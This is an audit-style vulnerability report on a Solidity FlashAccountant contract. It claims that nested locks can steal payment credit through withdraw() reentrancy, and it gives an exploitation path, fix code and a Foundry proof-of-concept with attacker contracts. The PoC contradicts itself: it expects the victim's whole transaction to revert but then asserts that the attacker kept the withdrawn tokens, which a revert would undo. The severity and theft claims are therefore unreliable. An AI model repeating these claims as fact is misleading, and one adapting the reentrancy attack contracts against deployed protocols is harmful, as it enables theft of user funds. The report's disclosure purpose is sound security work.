## Title
Payment Tracking State Leakage Allows Nested Locks to Steal Credits from Outer Locks

## Summary
The `startPayments()` and `completePayments()` functions in FlashAccountant use global transient storage that is not scoped by lock ID, allowing a nested lock to consume payment tracking state set by an outer lock. This enables an attacker to steal payment credits during reentrancy callbacks, violating the flash accounting invariant and enabling theft of user funds.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/FlashAccountant.sol` - `startPayments()` (lines 224-254) and `completePayments()` (lines 257-319)

**Intended Logic:** The payment tracking system is designed to allow users to credit tokens to their lock's debt by calling `startPayments()` before transferring tokens, then `completePayments()` afterward. The payment amount is calculated as the difference in balances and credited to the current locker's debt.

**Actual Logic:** The payment tracking storage uses a slot calculated as `_PAYMENT_TOKEN_ADDRESS_OFFSET + token`, which is NOT scoped by lock ID. This means all locks (nested or not) share the same payment tracking state for each token. When `completePayments()` is called, it reads and clears this global state, then credits the payment to the calling lock's debt based on the lock ID from `_getLocker().id()`. [1](#0-0) [2](#0-1) [3](#0-2) 

**Exploitation Path:**

1. **Victim initiates lock (ID 0):** Victim calls `lock()` and inside the callback calls `startPayments([USDC])`, which stores the current USDC balance in the global payment tracking slot `_PAYMENT_TOKEN_ADDRESS_OFFSET + USDC`.

2. **Victim transfers tokens:** Victim transfers 1000 USDC to the accountant contract, increasing its USDC balance.

3. **Victim calls withdraw():** Victim legitimately calls `withdraw()` to send 1 ETH to an attacker-controlled address, which increases the victim's debt for ETH in lock ID 0.

4. **Reentrancy during ETH transfer:** During the ETH transfer callback at line 350 of `withdraw()`, the attacker's `receive()` function is triggered. [4](#0-3) 

5. **Attacker creates nested lock (ID 1):** Inside the callback, the attacker calls `lock()` again, creating a nested lock with ID 1.

6. **Attacker steals payment credit:** Inside the nested lock's callback, the attacker calls `completePayments([USDC])`:
   - Line 268 reads the `lastBalance` from the global payment slot (set by victim)
   - Line 269 CLEARS the global payment slot to 0
   - Lines 283-287 calculate the payment based on victim's tracked balance
   - Line 299 credits the payment to lock ID 1's debt (attacker's lock, NOT victim's)

7. **Attacker withdraws tokens:** Attacker calls `withdraw()` to extract 1000 USDC and exits the nested lock with zero debt.

8. **Victim's lock fails:** When control returns to the victim's lock (ID 0), they try to call `completePayments([USDC])` but the global payment slot is now 0 (cleared by attacker), so no credit is given. The victim's lock fails with `DebtsNotZeroed(0)` because their USDC payment was stolen.

**Security Property Broken:** This violates the **Flash Accounting** invariant that "all flash loans must be repaid within the same transaction with proper accounting" and the **Solvency** invariant by allowing an attacker to withdraw tokens without properly paying for them, as the payment credit is misdirected to the wrong lock.

## Impact Explanation
- **Affected Assets**: All ERC20 tokens used in the protocol. The attacker can steal any tokens that a victim intends to pay to settle their debt.
- **Damage Severity**: An attacker can steal 100% of tokens that victims transfer to the accountant during their lock operations. The victim's transaction reverts (DoS), and the attacker extracts tokens without paying the corresponding debt.
- **User Impact**: Any user performing operations that involve `startPayments()` → token transfer → `withdraw()` to an attacker-controlled address is vulnerable. This includes LP operations, swaps, and position management where callbacks occur.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user who can receive ETH or tokens during a `withdraw()` callback.
- **Preconditions**: 
  - A victim must be using the `startPayments()/completePayments()` flow
  - The victim must call `withdraw()` to transfer ETH or tokens to an attacker-controlled address during their lock
  - The attacker's address must implement a malicious `receive()` or transfer callback
- **Execution Complexity**: Single transaction with reentrancy via callback. Straightforward to execute once the victim triggers `withdraw()` to the attacker's address.
- **Frequency**: Can be exploited on every transaction where a victim sends ETH/tokens to an attacker address within their lock, which is common in routing/swap scenarios.

## Recommendation

The payment tracking storage must be scoped by lock ID to prevent cross-lock contamination:

```solidity
// In src/base/FlashAccountant.sol, function startPayments(), line 249:

// CURRENT (vulnerable):
tstore(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token), add(tokenBalance, success))

// FIXED:
// Scope payment tracking by lock ID similar to debt tracking
let lockerId := shr(160, tload(_CURRENT_LOCKER_SLOT))
let paymentSlot := add(_PAYMENT_TOKEN_ADDRESS_OFFSET, add(shl(160, lockerId), token))
tstore(paymentSlot, add(tokenBalance, success))
```

```solidity
// In src/base/FlashAccountant.sol, function completePayments(), line 267:

// CURRENT (vulnerable):
let offset := add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token)

// FIXED:
// Use lock ID in payment slot calculation to match startPayments
let paymentSlot := add(_PAYMENT_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
let offset := paymentSlot
```

This ensures that each lock's payment tracking state is isolated and cannot be accessed or cleared by nested locks.

## Proof of Concept

```solidity
// File: test/Exploit_PaymentLeakage.t.sol
// Run with: forge test --match-test test_PaymentLeakageBetweenLocks -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/base/FlashAccountant.sol";
import "../src/interfaces/IFlashAccountant.sol";
import {BaseLocker} from "../src/base/BaseLocker.sol";
import {TestToken} from "./TestToken.sol";
import {Locker} from "../src/types/locker.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";

contract Accountant is FlashAccountant {
    function getLocker() external view returns (Locker locker) {
        locker = _getLocker();
    }
}

contract VictimLocker is BaseLocker {
    TestToken public token;
    address public attacker;
    
    constructor(IFlashAccountant accountant, TestToken _token, address _attacker) 
        BaseLocker(accountant) 
    {
        token = _token;
        attacker = _attacker;
    }
    
    function executeVictimFlow() external {
        lock(abi.encode("victim"));
    }
    
    function handleLockData(uint256, bytes memory) internal override returns (bytes memory) {
        // 1. Start payment tracking for USDC
        bytes memory startCallData = abi.encodeWithSelector(
            IFlashAccountant.startPayments.selector
        );
        startCallData = abi.encodePacked(startCallData, abi.encode(address(token)));
        (bool success,) = address(ACCOUNTANT).call(startCallData);
        require(success, "startPayments failed");
        
        // 2. Transfer 1000 tokens to accountant
        token.transfer(address(ACCOUNTANT), 1000 ether);
        
        // 3. Withdraw 1 ETH to attacker (triggers reentrancy)
        bytes memory withdrawCallData = abi.encodeWithSelector(
            IFlashAccountant.withdraw.selector
        );
        // Pack: token (20) + recipient (20) + amount (16)
        withdrawCallData = abi.encodePacked(
            withdrawCallData,
            bytes20(NATIVE_TOKEN_ADDRESS),
            bytes20(attacker),
            bytes16(uint128(1 ether))
        );
        (success,) = address(ACCOUNTANT).call(withdrawCallData);
        require(success, "withdraw failed");
        
        // 4. Try to complete payments (will fail - payment was stolen!)
        bytes memory completeCallData = abi.encodeWithSelector(
            IFlashAccountant.completePayments.selector
        );
        completeCallData = abi.encodePacked(completeCallData, abi.encode(address(token)));
        (success,) = address(ACCOUNTANT).call(completeCallData);
        require(success, "completePayments failed");
        
        return "";
    }
    
    receive() external payable {}
}

contract AttackerReceiver is BaseLocker {
    TestToken public token;
    bool public attacked;
    
    constructor(IFlashAccountant accountant, TestToken _token) 
        BaseLocker(accountant) 
    {
        token = _token;
    }
    
    function handleLockData(uint256, bytes memory) internal override returns (bytes memory) {
        // Steal the payment credit from outer lock
        bytes memory completeCallData = abi.encodeWithSelector(
            IFlashAccountant.completePayments.selector
        );
        completeCallData = abi.encodePacked(completeCallData, abi.encode(address(token)));
        (bool success,) = address(ACCOUNTANT).call(completeCallData);
        require(success, "attacker completePayments failed");
        
        // Withdraw the stolen tokens
        bytes memory withdrawCallData = abi.encodeWithSelector(
            IFlashAccountant.withdraw.selector
        );
        withdrawCallData = abi.encodePacked(
            withdrawCallData,
            bytes20(address(token)),
            bytes20(address(this)),
            bytes16(uint128(1000 ether))
        );
        (success,) = address(ACCOUNTANT).call(withdrawCallData);
        require(success, "attacker withdraw failed");
        
        return "";
    }
    
    receive() external payable {
        if (!attacked) {
            attacked = true;
            // Create nested lock and steal payment credit
            lock(abi.encode("attacker"));
        }
    }
}

contract Exploit_PaymentLeakage is Test {
    Accountant public accountant;
    TestToken public token;
    VictimLocker public victim;
    AttackerReceiver public attacker;
    
    function setUp() public {
        accountant = new Accountant();
        token = new TestToken(address(this));
        
        attacker = new AttackerReceiver(IFlashAccountant(address(accountant)), token);
        victim = new VictimLocker(IFlashAccountant(address(accountant)), token, address(attacker));
        
        // Fund accountant with ETH for victim to withdraw
        vm.deal(address(accountant), 100 ether);
        
        // Give victim tokens to pay
        token.transfer(address(victim), 1000 ether);
    }
    
    function test_PaymentLeakageBetweenLocks() public {
        uint256 attackerBalanceBefore = token.balanceOf(address(attacker));
        
        // EXPLOIT: Victim tries to use startPayments/completePayments
        // but attacker steals the payment credit during withdraw callback
        vm.expectRevert(
            abi.encodeWithSelector(IFlashAccountant.DebtsNotZeroed.selector, 0)
        );
        victim.executeVictimFlow();
        
        // VERIFY: Attacker successfully stole 1000 tokens even though victim paid them
        uint256 attackerBalanceAfter = token.balanceOf(address(attacker));
        assertEq(
            attackerBalanceAfter - attackerBalanceBefore,
            1000 ether,
            "Attacker stole payment credit: extracted 1000 tokens without paying debt"
        );
        
        // Victim's tokens are stuck in accountant, payment credit was stolen
        assertEq(
            token.balanceOf(address(accountant)),
            1000 ether,
            "Victim's tokens remain in accountant but credit was stolen"
        );
    }
}
```

## Notes

This vulnerability exists because the payment tracking system was designed for efficiency using global transient storage per token, but this breaks the isolation guarantee between nested locks. The comment at line 345-347 in `withdraw()` acknowledges that reentrancy can occur but incorrectly assumes safety due to delta-based updates to `nzdCountChange`. However, the payment tracking state (`_PAYMENT_TOKEN_ADDRESS_OFFSET + token`) is not protected by this mechanism—it can be consumed by any lock that calls `completePayments()`. [5](#0-4) 

The debt tracking itself IS properly scoped by lock ID (using `_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET + (id << 160) + token`), which prevents direct debt manipulation. However, the payment tracking bypass allows an attacker to credit debt incorrectly, achieving the same effect of stealing funds. [6](#0-5)

### Citations

**File:** src/base/FlashAccountant.sol (L69-69)
```text
            let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
```

**File:** src/base/FlashAccountant.sol (L249-249)
```text
                tstore(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token), add(tokenBalance, success))
```

**File:** src/base/FlashAccountant.sol (L267-269)
```text
                let offset := add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token)
                let lastBalance := tload(offset)
                tstore(offset, 0)
```

**File:** src/base/FlashAccountant.sol (L299-307)
```text
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)

                    // never overflows because of the payment overflow check that bounds payment to 128 bits
                    let next := sub(current, payment)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)
```

**File:** src/base/FlashAccountant.sol (L345-347)
```text
                    // Note that these calls can re-enter and even relock with the same ID
                    // However the nzdCountChange is always applied as a delta at the end, meaning we load the latest value before updating it,
                    // so it's safe from re-entry
```

**File:** src/base/FlashAccountant.sol (L349-355)
```text
                    case 0 {
                        let success := call(gas(), recipient, amount, 0, 0, 0, 0)
                        if iszero(success) {
                            // cast sig "ETHTransferFailed()"
                            mstore(0x00, 0xb12d13eb)
                            revert(0x1c, 4)
                        }
```
